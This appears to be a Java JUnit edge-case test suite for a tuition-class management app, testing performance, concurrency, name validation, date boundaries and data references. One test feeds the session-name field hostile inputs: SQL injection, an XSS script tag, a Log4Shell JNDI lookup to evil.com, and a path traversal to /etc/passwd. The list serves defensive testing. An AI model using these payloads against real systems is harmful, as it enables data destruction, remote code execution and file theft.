package seedu.address.model.classroom;

import static org.junit.jupiter.api.Assertions.*;

import java.time.LocalDateTime;
import java.util.HashSet;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import org.junit.jupiter.api.Test;

import seedu.address.model.person.Address;
import seedu.address.model.person.Email;
import seedu.address.model.person.Name;
import seedu.address.model.person.Phone;
import seedu.address.model.person.Student;
import seedu.address.model.person.Tutor;
import seedu.address.model.person.Parent;

/**
 * Extreme Edge Case Test Suite
 * Tests performance limits, race conditions, and unusual but valid inputs
 */
public class ExtremeCaseTest {

    private Student createStudent(String name) {
        return new Student(
            new Name(name),
            new Phone("12345678"),
            new Email("test@test.com"),
            new Address("123 Test St"),
            new HashSet<>()
        );
    }

    private Tutor createTutor(String name) {
        return new Tutor(
            new Name(name),
            new Phone("87654321"),
            new Email("tutor@test.com"),
            new Address("456 Tutor Ave"),
            new HashSet<>()
        );
    }

    private Parent createParent(String name) {
        return new Parent(
            new Name(name),
            new Phone("99999999"),
            new Email("parent@test.com"),
            new Address("789 Parent Rd"),
            new HashSet<>()
        );
    }

    /**
     * TEST: Session names can collide across different classes
     */
    @Test
    public void testSessionNameCollisionAcrossClasses() {
        System.out.println("\n=== TEST: Session Name Collision ===");

        TuitionClass math = new TuitionClass(new ClassName("Math"));
        TuitionClass physics = new TuitionClass(new ClassName("Physics"));

        // Both classes use generic session names
        ClassSession mathWeek1 = math.addSession("Week 1", LocalDateTime.now(), "Room A");
        ClassSession physicsWeek1 = physics.addSession("Week 1", LocalDateTime.now(), "Room B");

        System.out.println("Both classes have 'Week 1' session");
        System.out.println("Math Week 1: " + mathWeek1.getSessionName());
        System.out.println("Physics Week 1: " + physicsWeek1.getSessionName());

        // This works but could cause confusion in reporting
        assertEquals("Week 1", mathWeek1.getSessionName());
        assertEquals("Week 1", physicsWeek1.getSessionName());

        System.out.println("⚠ ISSUE: No globally unique session identifiers");
        System.out.println("  - Confusing in cross-class reports");
        System.out.println("  - No session ID system");
    }

    /**
     * TEST: Performance with 1000 students in single class
     */
    @Test
    public void testMassiveClassPerformance() {
        System.out.println("\n=== TEST: 1000 Students Performance ===");

        TuitionClass megaClass = new TuitionClass(new ClassName("MegaClass"));

        long startTime = System.currentTimeMillis();

        // Add 1000 students
        for (int i = 1; i <= 1000; i++) {
            Student s = createStudent("Student" + i);
            megaClass.addStudent(s);
        }

        long addTime = System.currentTimeMillis() - startTime;
        System.out.println("Time to add 1000 students: " + addTime + "ms");

        // Create session
        startTime = System.currentTimeMillis();
        ClassSession session = megaClass.addSession("MegaSession", LocalDateTime.now(), "Stadium");
        long sessionTime = System.currentTimeMillis() - startTime;
        System.out.println("Time to create session with 1000 students: " + sessionTime + "ms");

        // Mark all present
        startTime = System.currentTimeMillis();
        for (Student s : megaClass.getStudents()) {
            session.markPresent(s);
        }
        long markTime = System.currentTimeMillis() - startTime;
        System.out.println("Time to mark 1000 students present: " + markTime + "ms");

        // Get attendance details
        startTime = System.currentTimeMillis();
        String details = session.getSessionDetails();
        long detailTime = System.currentTimeMillis() - startTime;
        System.out.println("Time to generate attendance details: " + detailTime + "ms");
        System.out.println("Details string length: " + details.length() + " characters");

        if (addTime > 1000 || sessionTime > 100 || markTime > 1000 || detailTime > 500) {
            System.out.println("❌ PERFORMANCE ISSUE: Operations too slow for large classes");
        }

        assertEquals(1000, megaClass.getStudents().size());
        assertEquals(1000, session.getAttendanceCount());
    }

    /**
     * TEST: Race condition - concurrent student additions
     */
    @Test
    public void testConcurrentStudentAdditions() throws InterruptedException {
        System.out.println("\n=== TEST: Concurrent Student Additions ===");

        TuitionClass mathClass = new TuitionClass(new ClassName("ConcurrentMath"));
        int threadCount = 10;
        int studentsPerThread = 50;
        AtomicInteger successCount = new AtomicInteger(0);
        AtomicInteger errorCount = new AtomicInteger(0);

        ExecutorService executor = Executors.newFixedThreadPool(threadCount);
        CountDownLatch latch = new CountDownLatch(threadCount);

        for (int t = 0; t < threadCount; t++) {
            final int threadId = t;
            executor.submit(() -> {
                try {
                    for (int i = 0; i < studentsPerThread; i++) {
                        Student s = createStudent("T" + threadId + "_S" + i);
                        mathClass.addStudent(s);
                        successCount.incrementAndGet();
                    }
                } catch (Exception e) {
                    errorCount.incrementAndGet();
                } finally {
                    latch.countDown();
                }
            });
        }

        latch.await(5, TimeUnit.SECONDS);
        executor.shutdown();

        System.out.println("Expected students: " + (threadCount * studentsPerThread));
        System.out.println("Actual students: " + mathClass.getStudents().size());
        System.out.println("Successful adds: " + successCount.get());
        System.out.println("Errors: " + errorCount.get());

        if (mathClass.getStudents().size() != threadCount * studentsPerThread) {
            System.out.println("❌ BUG: Race condition - lost updates in concurrent access");
        } else {
            System.out.println("✓ Concurrent additions handled correctly");
        }
    }

    /**
     * TEST: Valid but unusual names
     */
    @Test
    public void testUnusualButValidNames() {
        System.out.println("\n=== TEST: Unusual Names ===");

        // Single letter names
        try {
            ClassName single = new ClassName("A");
            System.out.println("✓ Single letter class name accepted: " + single.value);
        } catch (Exception e) {
            System.out.println("❌ Single letter rejected: " + e.getMessage());
        }

        // Numbers only
        try {
            ClassName numbers = new ClassName("101");
            System.out.println("✓ Numbers-only class name accepted: " + numbers.value);
        } catch (Exception e) {
            System.out.println("❌ Numbers-only rejected: " + e.getMessage());
        }

        // All spaces (after trim should fail)
        try {
            ClassName spaces = new ClassName("     ");
            System.out.println("❌ BUG: Whitespace-only name accepted: '" + spaces.value + "'");
        } catch (IllegalArgumentException e) {
            System.out.println("✓ Whitespace-only rejected");
        }

        // Mixed scripts
        try {
            ClassName mixed = new ClassName("Math数学");
            System.out.println("✓ Mixed scripts accepted: " + mixed.value);
        } catch (Exception e) {
            System.out.println("Mixed scripts rejected: " + e.getMessage());
        }

        // Emoji (should fail)
        try {
            ClassName emoji = new ClassName("Math😀");
            System.out.println("❌ BUG: Emoji accepted: " + emoji.value);
        } catch (IllegalArgumentException e) {
            System.out.println("✓ Emoji rejected");
        }
    }

    /**
     * TEST: Session at exact midnight
     */
    @Test
    public void testMidnightSession() {
        System.out.println("\n=== TEST: Midnight Session ===");

        TuitionClass nightClass = new TuitionClass(new ClassName("NightClass"));
        LocalDateTime midnight = LocalDateTime.of(2025, 12, 31, 0, 0, 0);
        LocalDateTime almostMidnight = LocalDateTime.of(2025, 12, 31, 23, 59, 59);

        ClassSession session1 = nightClass.addSession("Midnight", midnight, "Room");
        ClassSession session2 = nightClass.addSession("AlmostMidnight", almostMidnight, "Room");

        System.out.println("Midnight session: " + session1.getDateTime());
        System.out.println("23:59:59 session: " + session2.getDateTime());

        // Test date boundary
        assertTrue(session1.getDateTime().toLocalDate().isAfter(
            session2.getDateTime().toLocalDate()));

        System.out.println("⚠ Edge case: Sessions crossing date boundary");
        System.out.println("  - Could affect daily reports");
        System.out.println("  - Which day does midnight belong to?");
    }

    /**
     * TEST: Orphaned parent after all children deleted
     */
    @Test
    public void testOrphanedParent() {
        System.out.println("\n=== TEST: Orphaned Parent ===");

        Parent parent = createParent("Mr Parent");
        Student child1 = createStudent("Child One");
        Student child2 = createStudent("Child Two");

        // Link parent to children
        parent.addChild(child1);
        parent.addChild(child2);
        child1.addParent(parent);
        child2.addParent(parent);

        System.out.println("Parent has " + parent.getChildren().size() + " children");

        // Delete both children (simulate)
        child1.delete();
        child2.delete();

        System.out.println("After deleting children:");
        System.out.println("Parent still has " + parent.getChildren().size() + " children");

        if (parent.getChildren().size() > 0) {
            System.out.println("❌ BUG: Parent has references to deleted children");
        } else {
            System.out.println("✓ Parent-child references cleaned up");
        }

        // Parent is now orphaned - should they be notified? Auto-deleted?
        System.out.println("⚠ ISSUE: Orphaned parent in system");
        System.out.println("  - No notification system");
        System.out.println("  - Takes up space in database");
        System.out.println("  - Appears in parent lists with no children");
    }

    /**
     * TEST: Session with same name but different case
     */
    @Test
    public void testSessionNameCaseVariations() {
        System.out.println("\n=== TEST: Session Name Case Variations ===");

        TuitionClass mathClass = new TuitionClass(new ClassName("Math"));

        ClassSession session1 = mathClass.addSession("Week1", LocalDateTime.now(), "Room");

        // Try to add same name with different case
        try {
            ClassSession session2 = mathClass.addSession("WEEK1", LocalDateTime.now().plusHours(1), "Room");
            System.out.println("❌ BUG: Allowed duplicate session with different case");
        } catch (IllegalArgumentException e) {
            System.out.println("✓ Duplicate session (different case) prevented");
        }

        // Try mixed case
        try {
            ClassSession session3 = mathClass.addSession("wEeK1", LocalDateTime.now().plusHours(2), "Room");
            System.out.println("❌ BUG: Allowed duplicate session with mixed case");
        } catch (IllegalArgumentException e) {
            System.out.println("✓ Duplicate session (mixed case) prevented");
        }
    }

    /**
     * TEST: Circular reference in data model
     */
    @Test
    public void testCircularReferences() {
        System.out.println("\n=== TEST: Circular References ===");

        TuitionClass class1 = new TuitionClass(new ClassName("Class1"));
        TuitionClass class2 = new TuitionClass(new ClassName("Class2"));
        Student alice = createStudent("Alice");
        Tutor mrSmith = createTutor("Mr Smith");

        // Create circular references
        class1.addStudent(alice);
        alice.addClass(class1);  // Already done by addStudent - duplicate?

        class1.setTutor(mrSmith);
        mrSmith.addClass(class1);  // Already done by setTutor - duplicate?

        System.out.println("Checking for duplicate references...");
        int count = 0;
        for (TuitionClass tc : alice.getTuitionClasses()) {
            if (tc.equals(class1)) count++;
        }
        System.out.println("Alice has class1 " + count + " times");

        count = 0;
        for (TuitionClass tc : mrSmith.getTuitionClasses()) {
            if (tc.equals(class1)) count++;
        }
        System.out.println("Mr Smith has class1 " + count + " times");

        if (count > 1) {
            System.out.println("❌ BUG: Duplicate references possible");
        } else {
            System.out.println("✓ Bidirectional references maintained correctly");
        }
    }

    /**
     * TEST: Session name SQL injection attempt
     */
    @Test
    public void testSessionNameInjection() {
        System.out.println("\n=== TEST: SQL Injection in Session Name ===");

        TuitionClass mathClass = new TuitionClass(new ClassName("Math"));

        // Try SQL injection patterns
        String[] injectionPatterns = {
            "Week1'; DROP TABLE sessions; --",
            "Week1\" OR \"1\"=\"1",
            "Week1/**/UNION/**/SELECT/**/1,2,3",
            "Week1<script>alert('XSS')</script>",
            "Week1${jndi:ldap://evil.com/a}",  // Log4Shell pattern
            "../../../etc/passwd",  // Path traversal
        };

        for (String pattern : injectionPatterns) {
            try {
                ClassSession session = mathClass.addSession(pattern, LocalDateTime.now(), "Room");
                System.out.println("⚠ Accepted potentially dangerous input: " + pattern);
                // In real system, this could be dangerous if not properly escaped
            } catch (Exception e) {
                System.out.println("✓ Rejected dangerous pattern: " + pattern);
            }
        }

        System.out.println("\n⚠ WARNING: System accepts all string patterns");
        System.out.println("  - No input sanitization");
        System.out.println("  - Could cause issues if data exported to SQL/HTML");
        System.out.println("  - Need proper escaping in storage/display layers");
    }

    /**
     * TEST: Year 2038 problem (32-bit Unix timestamp overflow)
     */
    @Test
    public void testYear2038Problem() {
        System.out.println("\n=== TEST: Year 2038 Problem ===");

        TuitionClass futureClass = new TuitionClass(new ClassName("FutureClass"));

        // January 19, 2038, 03:14:08 UTC - the overflow point
        LocalDateTime year2038 = LocalDateTime.of(2038, 1, 19, 3, 14, 8);
        LocalDateTime afterOverflow = LocalDateTime.of(2038, 1, 19, 3, 14, 9);

        try {
            ClassSession session1 = futureClass.addSession("Before", year2038, "Room");
            ClassSession session2 = futureClass.addSession("After", afterOverflow, "Room");

            System.out.println("✓ Year 2038 dates handled correctly");
            System.out.println("  Using LocalDateTime avoids 32-bit timestamp issue");
        } catch (Exception e) {
            System.out.println("❌ Failed at year 2038: " + e.getMessage());
        }
    }

    /**
     * Run all extreme tests
     */
    public static void main(String[] args) {
        ExtremeCaseTest test = new ExtremeCaseTest();

        System.out.println("==========================================");
        System.out.println("     EXTREME EDGE CASE TEST SUITE");
        System.out.println("==========================================");

        try { test.testSessionNameCollisionAcrossClasses(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        try { test.testMassiveClassPerformance(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        try { test.testConcurrentStudentAdditions(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        try { test.testUnusualButValidNames(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        try { test.testMidnightSession(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        try { test.testOrphanedParent(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        try { test.testSessionNameCaseVariations(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        try { test.testCircularReferences(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        try { test.testSessionNameInjection(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        try { test.testYear2038Problem(); } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }

        System.out.println("\n==========================================");
        System.out.println("    EXTREME TESTS COMPLETE");
        System.out.println("==========================================");
    }
}